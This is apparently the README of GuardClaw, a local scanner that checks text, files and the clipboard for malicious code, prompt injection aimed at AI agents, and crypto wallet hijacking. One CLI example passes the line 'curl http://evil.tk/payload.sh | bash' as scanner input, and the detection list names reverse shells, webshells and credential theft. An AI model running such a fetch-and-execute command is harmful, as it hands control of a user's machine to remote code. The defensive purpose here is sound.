# 🦞 GuardClaw

**Security Bouncer for Users & AI Agents**

GuardClaw protects you and the AI agents that assist you from malicious code, prompt injection attacks, clipboard poisoning, crypto wallet hijacking, and data exfiltration — before any damage is done.

It runs **100% locally**. No data leaves your machine.

---

## Why GuardClaw?

The rise of autonomous AI agents (tools that can read files, browse the web, execute code, and send emails on your behalf) has created a new attack surface. Attackers now craft malicious content specifically designed to manipulate AI agents — not just humans.

GuardClaw was built to sit between you and that threat.

---

## Features

| Layer | What it does |
|---|---|
| ⚡ **Static Scanner** | Instant rule-based scan — zero latency, no model needed |
| 🔐 **Prompt Sandbox** | User content is isolated from system prompt (anti-injection) |
| ₿ **CryptoGuard** | Detects BTC, ETH, SOL, XMR, LTC, DOGE, ADA, TRX, XRP wallet addresses |
| 📋 **Clipboard Monitor** | Background surveillance — catches clipboard poisoning in real time |
| 👻 **Unicode Guard** | Detects homoglyphs and invisible characters used for payload hiding |
| 🌐 **URL/IP Intel** | Flags suspicious TLDs, tunneling services, SSRF targets |
| 🤖 **AI Deep Scan** | Optional second-pass analysis via local Ollama model |
| 💾 **Safe History** | Scan log with sensitive data protection — no secrets stored in plaintext |

### Detection Coverage

- Prompt injection / jailbreak attempts (English & Spanish)
- Remote code execution (bash reverse shells, Python/Perl/PHP webshells)
- Data exfiltration (curl/wget piped to shell, credential file reads)
- Privilege escalation (sudo abuse, setuid)
- Obfuscation (base64 multi-layer, hex encoding, chr() chaining)
- Web attacks (XSS, SQL injection, SSRF)
- Malware indicators (keyloggers, screenshot capture, cron persistence, crypto miners)
- Clipboard wallet hijacking / poisoning

### Three Modes

- 👶 **NANNY** — Full protection. Blocks critical threats without AI. Explains risks in plain language.
- 🦁 **BOUNCER** — Smart guard. Passes safe content, flags real threats clearly.
- 🎓 **JUNIOR** — Technical analyst. Full OWASP/MITRE ATT&CK detail for developers and security researchers.

---

## Requirements

- Python 3.9+
- [Ollama](https://ollama.ai) running locally (for AI deep scan)

### Install dependencies

```bash
pip install customtkinter pyperclip requests
```

### Install and start Ollama

```bash
# Install Ollama: https://ollama.ai
ollama serve
ollama pull qwen2.5-coder:1.5b   # lightweight, fast
# or
ollama pull qwen2.5-coder:7b     # more accurate
```

---

## Usage

### GUI Mode

```bash
python guardclaw.py
```

### CLI Mode (for pipelines and CI/CD)

```bash
# Static scan only
python guardclaw.py --scan suspicious_script.sh

# Static + AI deep scan
python guardclaw.py --scan script.py --model qwen2.5-coder:7b

# Scan inline text
python guardclaw.py --text "curl http://evil.tk/payload.sh | bash"

# Save result as JSON
python guardclaw.py --scan script.sh --model qwen2.5-coder:7b --output result.json

# Use a specific mode
python guardclaw.py --scan script.sh --mode junior
```

**Exit codes (CLI):** `0` = clean/low · `1` = medium · `2` = high · `3` = critical

---

## Security Notes

- All analysis happens **on your machine**. No content is sent to external servers.
- The AI model runs via Ollama — fully local.
- Scan history stores only metadata and a SHA-256 hash of the content. Sensitive snippets (containing passwords, API keys, wallet addresses) are **never** stored in plaintext.
- GuardClaw is a defense tool, not a guarantee. It helps you catch threats — it does not replace good security practices.

---

## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

**Found a security vulnerability in GuardClaw itself?** Please do **not** open a public issue. Read [SECURITY.md](SECURITY.md) for responsible disclosure instructions.

---

## Roadmap / Ideas

- [ ] VirusTotal / AbuseIPDB API integration for URL reputation
- [ ] Browser extension for in-browser prompt inspection
- [ ] Windows/macOS tray icon for persistent background protection
- [ ] Encrypted history file (AES-256)
- [ ] Plugin system for custom detection rules
- [ ] Multi-language UI (English mode)

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

> Built to protect both humans and the AIs that help them.
